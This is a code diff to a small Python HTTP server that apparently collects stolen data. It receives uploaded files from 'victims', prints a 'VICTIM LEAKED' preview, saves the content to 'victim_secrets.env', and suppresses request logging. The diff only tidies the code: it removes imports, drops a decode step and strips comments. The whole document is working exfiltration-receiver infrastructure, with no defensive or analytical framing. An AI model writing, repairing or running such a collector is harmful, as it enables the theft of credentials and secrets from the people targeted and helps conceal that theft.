@@ -1,7 +1,5 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import unquote
 import cgi
-import os
 
 class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -12,8 +10,8 @@ class Handler(BaseHTTPRequestHandler):
                 environ={'REQUEST_METHOD': 'POST'}
             )
             if 'file' in form:
-                leaked_env = form['file'].value.decode('utf-8')
-                print(f"VICTIM LEAKED: {leaked_env[:200]}...")  # Log preview
+                leaked_env = form['file'].value  # Already string
+                print(f"VICTIM LEAKED: {leaked_env[:200]}...")
                 with open('victim_secrets.env', 'w') as f:
                     f.write(leaked_env)
                 self.send_response(200)
@@ -28,7 +26,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def log_message(self, format, *args):
-        return  # Silent logs
+        return
 
 if __name__ == '__main__':
     httpd = HTTPServer(('0.0.0.0', 8080), Handler)
